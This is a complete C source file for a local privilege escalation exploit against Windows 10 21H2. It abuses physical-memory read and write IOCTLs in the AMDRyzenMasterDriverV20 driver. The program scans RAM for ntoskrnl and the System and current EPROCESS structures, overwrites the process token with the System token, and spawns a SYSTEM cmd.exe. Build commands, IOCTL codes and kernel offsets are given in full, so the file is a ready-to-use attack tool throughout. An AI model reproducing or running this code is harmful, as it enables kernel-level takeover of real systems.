/*
 * amd_lpe_full.c  --  LPE via AMDRyzenMasterDriverV20
 * Target : Windows 10 21H2 (19041-19044) x64
 * Driver : AMDRyzenMasterDriverV20 (AUTO_START, Admin-only)
 *
 * Chain:
 *   1. Open \\.\AMDRyzenMasterDriverV20  (Admin, no SeLoadDriverPriv)
 *   2. NtQuerySI  -> ntoskrnl VA
 *   3. 2MB scan   -> ntoskrnl PA  (match NtBuildNumber 0xF000xxxx)
 *   4. 4KB scan   -> System EPROCESS PA + Current EPROCESS PA  (one pass)
 *   5. phys_read  -> System Token
 *   6. phys_write -> Current EPROCESS.Token = System Token
 *   7. CreateProcess cmd.exe  (inherits SYSTEM token)
 *   8. Wait for user, then restore token
 *
 * Build:
 *   cl /nologo /W3 /O2 amd_lpe_full.c /link kernel32.lib advapi32.lib ntdll.lib
 *
 * Run as Administrator.
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ─── Driver ────────────────────────────────────────────────────────────── */
#define DEVICE       L"\\\\.\\AMDRyzenMasterDriverV20"
#define IOCTL_READ   0x81112F08u   /* IN:{u64 pa, u32 sz}  OUT:{pa,sz,data} @+12 */
#define IOCTL_WRITE  0x81112F0Cu   /* IN:{u64 pa, u32 sz, data[sz]}               */

/* ─── EPROCESS offsets  Win10 19041-19044 ──────────────────────────────── */
#define OFF_DTB    0x028   /* DirectoryTableBase (CR3)  */
#define OFF_PID    0x440   /* UniqueProcessId           */
#define OFF_TOKEN  0x4B8   /* Token (_EX_FAST_REF)      */
#define OFF_NAME   0x5A8   /* ImageFileName[15]         */
#define EPROC_SZ   (OFF_NAME + 16)

/* ─── Physical ranges ───────────────────────────────────────────────────── */
#define MAX_RANGES 64
typedef struct { uint64_t base, size; } Range;
static Range   g_ranges[MAX_RANGES];
static int     g_nranges = 0;
static HANDLE  g_dev = INVALID_HANDLE_VALUE;

static void ranges_load(void)
{
    HKEY hk;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
            0, KEY_READ, &hk) != ERROR_SUCCESS) return;

    char   name[256]; DWORD ns, ds, type;
    uint8_t *buf = NULL; DWORD sz = 0;
    for (DWORD i = 0; ; i++) {
        ns = sizeof name; ds = 0;
        if (RegEnumValueA(hk,i,name,&ns,NULL,&type,NULL,&ds)==ERROR_NO_MORE_ITEMS) break;
        if ((type!=3&&type!=8) || ds<20) continue;
        buf = (uint8_t*)malloc(ds);
        if (!buf) continue;
        if (RegQueryValueExA(hk,name,NULL,NULL,buf,&ds)==ERROR_SUCCESS) { sz=ds; break; }
        free(buf); buf=NULL;
    }
    RegCloseKey(hk);
    if (!buf||sz<20) { free(buf); return; }

    DWORD cnt=*(DWORD*)(buf+16); uint8_t *p=buf+20;
    for (DWORD i=0; i<cnt&&g_nranges<MAX_RANGES; i++,p+=20) {
        if (p+20>buf+sz || p[0]!=3) continue;
        g_ranges[g_nranges].base = *(uint64_t*)(p+4);
        g_ranges[g_nranges].size = *(uint64_t*)(p+12);
        g_nranges++;
    }
    free(buf);
}

static int in_range(uint64_t pa, uint32_t sz)
{
    for (int i=0; i<g_nranges; i++)
        if (pa >= g_ranges[i].base && pa+sz <= g_ranges[i].base+g_ranges[i].size)
            return 1;
    return 0;
}

/* ─── Phys R/W ──────────────────────────────────────────────────────────── */
static int phys_read(uint64_t pa, void *buf, uint32_t sz)
{
    struct { uint64_t pa; uint32_t sz; } in = {pa, sz};
    uint32_t osz = 12+sz;
    uint8_t *out = (uint8_t*)calloc(1, osz);
    if (!out) return 0;
    DWORD got=0;
    BOOL ok = DeviceIoControl(g_dev,IOCTL_READ,&in,sizeof(in),out,osz,&got,NULL);
    if (ok && got>=12) memcpy(buf, out+12, sz);
    free(out);
    return ok && got>=12;
}

static int phys_write(uint64_t pa, const void *data, uint32_t sz)
{
    if (!in_range(pa, sz)) {
        printf("  [!] BLOCKED write 0x%llX not in RAM range\n",
               (unsigned long long)pa);
        return 0;
    }
    uint32_t isz = 12+sz;
    uint8_t *ib = (uint8_t*)malloc(isz);
    if (!ib) return 0;
    *(uint64_t*)(ib)   = pa;
    *(uint32_t*)(ib+8) = sz;
    memcpy(ib+12, data, sz);
    DWORD got=0;
    BOOL ok = DeviceIoControl(g_dev,IOCTL_WRITE,ib,isz,NULL,0,&got,NULL);
    free(ib);
    return ok;
}

/* ─── ntoskrnl VA ───────────────────────────────────────────────────────── */
typedef NTSTATUS(NTAPI*PNTQSI)(ULONG,PVOID,ULONG,PULONG);
typedef struct{HANDLE S;PVOID MB;PVOID IB;ULONG IS,F;USHORT L,I,Lc,O;CHAR P[256];}MOD;
typedef struct{ULONG C;MOD M[1];}MODLIST;

static uint64_t nt_get_va(char *path_out)
{
    PNTQSI fn=(PNTQSI)GetProcAddress(GetModuleHandleA("ntdll"),
                                      "NtQuerySystemInformation");
    ULONG sz=0; fn(11,NULL,0,&sz); sz+=4096;
    MODLIST *ml=(MODLIST*)malloc(sz);
    fn(11,ml,sz,NULL);
    uint64_t va=(uint64_t)ml->M[0].IB;
    if (path_out) {
        GetWindowsDirectoryA(path_out,MAX_PATH);
        strcat_s(path_out,MAX_PATH,"\\system32\\ntoskrnl.exe");
    }
    free(ml); return va;
}

/* ─── NtBuildNumber RVA from PE on disk ─────────────────────────────────── */
static uint32_t pe_find_export_rva(const uint8_t *pe, size_t fsz, const char *sym)
{
    if (fsz<0x100||pe[0]!='M'||pe[1]!='Z') return 0;
    int32_t elf=*(int32_t*)(pe+0x3C);
    uint16_t ns=*(uint16_t*)(pe+elf+6), osz=*(uint16_t*)(pe+elf+20);
    uint32_t sb=(uint32_t)elf+24+osz;

    /* rva -> file offset helper */
    #define RVA2FO(rva, fo) do { (fo)=0; \
        for(uint16_t _i=0;_i<ns;_i++){ \
            uint32_t _s=sb+_i*40,_va=*(uint32_t*)(pe+_s+12); \
            uint32_t _vsz=*(uint32_t*)(pe+_s+16); if(!_vsz)_vsz=*(uint32_t*)(pe+_s+24); \
            uint32_t _fo=*(uint32_t*)(pe+_s+20); \
            if((rva)>=_va&&(rva)<_va+_vsz){(fo)=_fo+((rva)-_va);break;} } \
    } while(0)

    uint32_t erva=*(uint32_t*)(pe+elf+0x88), efo=0; RVA2FO(erva,efo);
    if (!efo||efo+40>fsz) return 0;
    const uint8_t *exp=pe+efo;
    uint32_t nn=*(uint32_t*)(exp+0x18);
    uint32_t rfn=*(uint32_t*)(exp+0x1C),rnm=*(uint32_t*)(exp+0x20),rod=*(uint32_t*)(exp+0x24);
    uint32_t ffn=0,fnm=0,fod=0; RVA2FO(rfn,ffn); RVA2FO(rnm,fnm); RVA2FO(rod,fod);
    if (!ffn||!fnm||!fod) return 0;
    for (uint32_t i=0; i<nn; i++) {
        uint32_t nrva=*(uint32_t*)(pe+fnm+i*4), nfo=0; RVA2FO(nrva,nfo);
        if (!nfo||nfo>=fsz) continue;
        if (strcmp((char*)(pe+nfo),sym)==0) {
            uint16_t ord=*(uint16_t*)(pe+fod+i*2);
            return *(uint32_t*)(pe+ffn+ord*4);
        }
    }
    #undef RVA2FO
    return 0;
}

/* ─── ntoskrnl PA via 2MB NtBuildNumber scan ────────────────────────────── */
static uint64_t nt_find_pa(const char *path)
{
    HANDLE hf=CreateFileA(path,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
    if (hf==INVALID_HANDLE_VALUE) return 0;
    DWORD fsz=GetFileSize(hf,NULL);
    uint8_t *pe=(uint8_t*)malloc(fsz);
    DWORD rd=0; ReadFile(hf,pe,fsz,&rd,NULL); CloseHandle(hf);

    uint32_t rva = pe_find_export_rva(pe,fsz,"NtBuildNumber");
    free(pe);
    if (!rva) { printf("  [-] NtBuildNumber RVA not found\n"); return 0; }
    printf("  NtBuildNumber RVA = 0x%08X\n", rva);

    uint32_t ssd = *(uint32_t*)(0x7FFE0000+0x260) & 0xFFFF;
    uint32_t c0=ssd, c1=ssd|0xF0000000, c2=ssd|0xC0000000;
    printf("  Candidates: 0x%X / 0x%X / 0x%X\n", c0, c1, c2);

    const uint64_t STEP = 0x200000ULL;
    for (int ri=0; ri<g_nranges; ri++) {
        uint64_t base=(g_ranges[ri].base+STEP-1)&~(STEP-1);
        uint64_t end=g_ranges[ri].base+g_ranges[ri].size;
        for (uint64_t pa=base; pa<end; pa+=STEP) {
            if (!in_range(pa+rva,4)) continue;
            uint32_t val=0;
            if (!phys_read(pa+rva,&val,4)) continue;
            if (val!=c0&&val!=c1&&val!=c2) continue;
            uint16_t mz=0; phys_read(pa,&mz,2);
            printf("  [HIT] PA=0x%012llX  val=0x%08X%s\n",
                   (unsigned long long)pa, val, mz==0x5A4D?" [MZ OK]":"");
            return pa;
        }
    }
    return 0;
}

/* ─── EPROCESS scan ─────────────────────────────────────────────────────── */
typedef struct {
    uint64_t eproc_pa, token, cr3;
    uint32_t pid;
    char     name[16];
} Eproc;

static int eproc_validate(const uint8_t *ep, uint32_t want_pid, Eproc *out)
{
    uint64_t pid   = *(uint64_t*)(ep+OFF_PID);
    uint64_t token = *(uint64_t*)(ep+OFF_TOKEN);
    uint64_t cr3   = *(uint64_t*)(ep+OFF_DTB);

    if (pid != want_pid)                         return 0;
    if (pid == 0 || pid > 0xFFFF)                return 0;
    if ((token & ~0xFULL) < 0xFFFF800000000000ULL) return 0;  /* not kernel VA */
    if (!cr3 || (cr3 & 0xFFF))                  return 0;  /* not page-aligned */
    if (cr3 > 0x10000000000ULL)                  return 0;  /* > 1TB, bogus */

    /* ImageFileName: all printable ASCII */
    for (int k=0; k<15; k++) {
        uint8_t c=ep[OFF_NAME+k];
        if (c==0) break;
        if (c<0x20||c>0x7E) return 0;
    }

    out->pid      = (uint32_t)pid;
    out->token    = token;
    out->cr3      = cr3;
    memcpy(out->name, ep+OFF_NAME, 15);
    out->name[15] = 0;
    return 1;
}

static int scan_two_eprocs(uint32_t cur_pid, Eproc *sys, Eproc *cur)
{
    uint8_t page[0x1000], ep[EPROC_SZ];
    int found_sys=0, found_cur=0;
    uint64_t last=0;

    for (int ri=0; ri<g_nranges&&!(found_sys&&found_cur); ri++) {
        uint64_t end=g_ranges[ri].base+g_ranges[ri].size;
        for (uint64_t pa=g_ranges[ri].base; pa+0x1000<=end; pa+=0x1000) {
            if (pa-last >= 0x40000000ULL) {
                printf("  [%5llu MB]  sys=%s  cur=%s\n",
                       (unsigned long long)(pa>>20),
                       found_sys?"FOUND":"....", found_cur?"FOUND":"....");
                last=pa;
                if (found_sys&&found_cur) goto done;
            }
            if (!phys_read(pa, page, sizeof page)) continue;

            for (int off=0; off+8<=0x1000; off+=8) {
                /* Pre-filter: first byte uppercase or lowercase letter */
                uint8_t c=page[off];
                if (c<'A'||c>'z') continue;

                if (!found_sys) {
                    uint64_t epa=pa+(uint64_t)off-OFF_NAME;
                    if (in_range(epa,EPROC_SZ) &&
                        phys_read(epa,ep,EPROC_SZ) &&
                        memcmp(ep+OFF_NAME,page+off,4)==0) {
                        if (eproc_validate(ep,4,sys)) {
                            sys->eproc_pa=epa; found_sys=1;
                            printf("  [+] System  PA=0x%016llX  name=%-15s  token=0x%016llX\n",
                                   (unsigned long long)epa, sys->name,
                                   (unsigned long long)sys->token);
                        }
                    }
                }
                if (!found_cur) {
                    uint64_t epa=pa+(uint64_t)off-OFF_NAME;
                    if (in_range(epa,EPROC_SZ) &&
                        phys_read(epa,ep,EPROC_SZ) &&
                        memcmp(ep+OFF_NAME,page+off,4)==0) {
                        if (eproc_validate(ep,cur_pid,cur)) {
                            cur->eproc_pa=epa; found_cur=1;
                            printf("  [+] Current PA=0x%016llX  name=%-15s  token=0x%016llX\n",
                                   (unsigned long long)epa, cur->name,
                                   (unsigned long long)cur->token);
                        }
                    }
                }
            }
        }
    }
done:
    return found_sys && found_cur;
}

/* ══════════════════════════════════════════════════════════════════════════ */
int main(void)
{
    printf("╔══════════════════════════════════════════════╗\n");
    printf("║   AMD Ryzen Master LPE  --  Token Theft     ║\n");
    printf("╚══════════════════════════════════════════════╝\n\n");

    /* ── 1. Open device ─────────────────────────────────────────────────── */
    printf("[1] Opening \\\\.\\" "AMDRyzenMasterDriverV20 ...\n");
    g_dev = CreateFileW(DEVICE, GENERIC_READ|GENERIC_WRITE,
                        0, NULL, OPEN_EXISTING, 0, NULL);
    if (g_dev == INVALID_HANDLE_VALUE) {
        printf("    [-] Failed (%lu) — run as Admin? AMD CPU? Driver running?\n",
               GetLastError());
        return 1;
    }
    printf("    [+] OK (no SeLoadDriverPrivilege needed)\n\n");

    ranges_load();
    printf("[+] Physical ranges: %d loaded\n\n", g_nranges);
    if (!g_nranges) { printf("[-] No ranges\n"); return 1; }

    /* ── 2. ntoskrnl VA ─────────────────────────────────────────────────── */
    printf("[2] ntoskrnl VA (NtQuerySystemInformation):\n");
    char nt_path[MAX_PATH]={0};
    uint64_t nt_va = nt_get_va(nt_path);
    printf("    VA   = 0x%016llX\n", (unsigned long long)nt_va);
    printf("    Path = %s\n\n", nt_path);

    /* ── 3. ntoskrnl PA ─────────────────────────────────────────────────── */
    printf("[3] ntoskrnl PA (2MB scan):\n");
    uint64_t nt_pa = nt_find_pa(nt_path);
    if (!nt_pa) {
        printf("    [-] Not found\n"); CloseHandle(g_dev); return 1;
    }
    printf("    PA   = 0x%016llX\n", (unsigned long long)nt_pa);
    printf("    Formula: target_PA = 0x%llX + (target_VA - 0x%llX)\n\n",
           (unsigned long long)nt_pa, (unsigned long long)nt_va);

    /* ── 4. EPROCESS scan ───────────────────────────────────────────────── */
    uint32_t my_pid = GetCurrentProcessId();
    printf("[4] EPROCESS scan  System(pid=4) + Current(pid=%u):\n", my_pid);
    Eproc sys={0}, cur={0};
    if (!scan_two_eprocs(my_pid, &sys, &cur)) {
        printf("\n    [-] Could not find both EPROCESS entries\n");
        CloseHandle(g_dev); return 1;
    }

    /* ── 5. Validate ────────────────────────────────────────────────────── */
    printf("\n[5] Validation:\n");
    printf("    System  token = 0x%016llX  (TOKEN* = 0x%016llX)\n",
           (unsigned long long)sys.token,
           (unsigned long long)(sys.token & ~0xFULL));
    printf("    Current token = 0x%016llX  (TOKEN* = 0x%016llX)\n",
           (unsigned long long)cur.token,
           (unsigned long long)(cur.token & ~0xFULL));

    if ((sys.token & ~0xFULL) < 0xFFFF800000000000ULL ||
        (cur.token & ~0xFULL) < 0xFFFF800000000000ULL) {
        printf("    [-] Token không hợp lệ — abort\n");
        CloseHandle(g_dev); return 1;
    }
    printf("    [+] Cả hai token đều là kernel VA hợp lệ\n\n");

    uint64_t token_pa = cur.eproc_pa + OFF_TOKEN;
    printf("    Current EPROCESS.Token PA = 0x%016llX\n\n",
           (unsigned long long)token_pa);

    /* ── 6. Token swap ──────────────────────────────────────────────────── */
    printf("[6] Token swap...\n");
    printf("    WRITE 0x%016llX <- 0x%016llX\n",
           (unsigned long long)token_pa, (unsigned long long)sys.token);

    if (!phys_write(token_pa, &sys.token, 8)) {
        printf("    [-] phys_write failed\n");
        CloseHandle(g_dev); return 1;
    }

    uint64_t verify=0;
    phys_read(token_pa, &verify, 8);
    if (verify != sys.token) {
        printf("    [-] Verify FAIL (got 0x%016llX) — token offset wrong?\n",
               (unsigned long long)verify);
        phys_write(token_pa, &cur.token, 8);
        CloseHandle(g_dev); return 1;
    }
    printf("    [+] Written & verified!\n\n");

    /* ── 7. Spawn SYSTEM shell ──────────────────────────────────────────── */
    printf("[7] Spawning cmd.exe (in this console)...\n");
    printf("    --> gõ 'whoami' để confirm SYSTEM\n");
    printf("    --> gõ 'exit'   để kết thúc và restore token\n\n");

    STARTUPINFOA si={sizeof si};
    PROCESS_INFORMATION pi={0};
    /* Không dùng CREATE_NEW_CONSOLE → cmd chạy trong cùng cửa sổ */
    BOOL ok = CreateProcessA("C:\\Windows\\System32\\cmd.exe", NULL,
                             NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    if (ok) {
        printf("    [+] cmd.exe PID=%lu — waiting...\n", pi.dwProcessId);
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        printf("    [-] CreateProcess failed: %lu\n", GetLastError());
    }

    /* ── 8. Restore ─────────────────────────────────────────────────────── */
    printf("\n[8] Restoring token...\n");
    if (phys_write(token_pa, &cur.token, 8))
        printf("    [+] Restored\n");
    else
        printf("    [-] Restore failed!\n");

    CloseHandle(g_dev);
    printf("\nDone.\n");
    return 0;
}
